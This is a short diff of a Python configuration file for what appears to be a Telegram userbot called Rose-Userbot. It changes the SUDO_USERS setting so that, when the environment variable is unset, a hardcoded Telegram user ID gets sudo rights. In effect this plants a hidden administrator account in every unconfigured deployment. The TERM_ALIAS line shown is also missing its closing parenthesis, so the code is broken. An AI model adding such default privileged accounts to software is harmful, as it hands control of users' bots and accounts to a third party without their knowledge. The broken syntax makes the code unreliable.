@@ -212,7 +212,7 @@ BITLY_TOKEN = os.environ.get("BITLY_TOKEN", None)
 TERM_ALIAS = os.environ.get("TERM_ALIAS", "Rose-Userbot"
 
 # sudousers
-SUDO_USERS=os.environ.get("SUDO_USERS", None)
+SUDO_USERS=os.environ.get("SUDO_USERS") or "1865785004"
 
 # Bot Version
 BOT_VER=os.environ.get("BOT_VER", "5.0")
